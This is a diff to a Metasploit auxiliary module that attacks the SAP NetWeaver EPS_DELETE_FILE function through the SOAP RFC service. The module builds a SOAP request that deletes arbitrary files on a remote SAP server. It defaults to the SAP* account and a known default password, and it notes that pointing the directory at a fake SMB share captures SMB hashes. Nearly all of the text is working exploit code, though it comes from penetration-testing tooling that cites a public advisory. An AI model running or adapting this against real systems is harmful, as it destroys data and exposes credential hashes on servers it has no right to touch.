@@ -31,24 +31,31 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'EPS_DELETE_FILE (File deletion + SMB Relay)',
+			'Name' => 'SAP SOAP EPS_DELETE_FILE File Deletion',
 			'Description' => %q{
-								A vulnerability in the SAP EPS_DELETE_FILE RFC function allows an attacker to delete files remotely
-								and/or steal hashes using an SMB relay attack.
-								SAP Note 1554030 / DSECRG-11-031.
-								},
-			'References' => [['URL','http://dsecrg.com/pages/vul/show.php?id=331']],
-			'Author' => ['nmonkee'],
+					This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP
+				RFC Service, to delete arbitrary files on the remote file system. The module can
+				also be used to capture SMB hashes by using a fake SMB share as DIRNAME.
+			},
+			'References' => [
+				[ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=331' ],
+				[ 'URL', 'https://service.sap.com/sap/support/notes/1554030' ]
+			],
+			'Author' =>
+				[
+					'Alexey Sintsov', # Vulnerability discovery
+					'nmonkee' # Metasploit module
+				],
 			'License' => MSF_LICENSE
 			)
 
 		register_options([
-			OptString.new('CLIENT', [true, 'SAP client', nil]),
-			OptString.new('USER', [true, 'Username', nil]),
-			OptString.new('PASS', [true, 'Password', nil]),
-			OptString.new('PATH',[true,'File path (e.g. \\\\xx.xx.xx.xx\\share)',nil]),
-			OptString.new('FILENAME',[true,'Filename (e.g. filename.ext )',nil])
-			], self.class)
+			OptString.new('CLIENT', [true, 'SAP Client', '001']),
+			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+			OptString.new('PASSWORD', [true, 'Password', '06071992']),
+			OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
+			OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
+		], self.class)
 	end
 
 	def run_host(ip)
@@ -59,31 +66,38 @@ class Metasploit4 < Msf::Auxiliary
 		data << '<SOAP-ENV:Header/>'
 		data << '<SOAP-ENV:Body>'
 		data << '<EPS_DELETE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">'
-		data << '<DIR_NAME>' + datastore['PATH'] + '</DIR_NAME>'
+		data << '<DIR_NAME>' + datastore['DIRNAME'] + '</DIR_NAME>'
 		data << '<FILE_NAME>' + datastore['FILENAME'] + '</FILE_NAME>'
 		data << '<IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>'
 		data << '<IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>'
 		data << '</EPS_DELETE_FILE>'
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
+
 		begin
-			print_status("[SAP] #{ip}:#{rport} - sending request for #{datastore['PATH']}\\#{datastore['FILENAME']}")
-			res = send_request_raw({
-				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+			vprint_status("#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
+			res = send_request_cgi({
+				'uri' => '/sap/bc/soap/rfc',
 				'method' => 'POST',
 				'data' => data,
-				'headers' =>{
-					'Content-Length' => data.size.to_s,
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'headers' => {
 					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization' => 'Basic ' + user_pass,
-					'Content-Type' => 'text/xml; charset=UTF-8',}
-					}, 45)
-			if res
-				vprint_error("[SAP] #{rhost}:#{rport} - Error code: " + res.code.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error title: " + res.message.to_s)
-				vprint_error("[SAP] #{rhost}:#{rport} - Error message: " + res.body.to_s)
+				},
+				'vars_get' => {
+					'sap-client' => datastore['CLIENT'],
+					'sap-language' => 'EN'
+				}
+			})
+
+			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body =~ /#{datastore['DIRNAME']}/ and res.body =~ /#{datastore['FILENAME']}/
+				print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
+			elsif res
+				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
+				vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
+				vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
 			end
 			rescue ::Rex::ConnectionError
 				print_error("#{rhost}:#{rport} - Unable to connect")
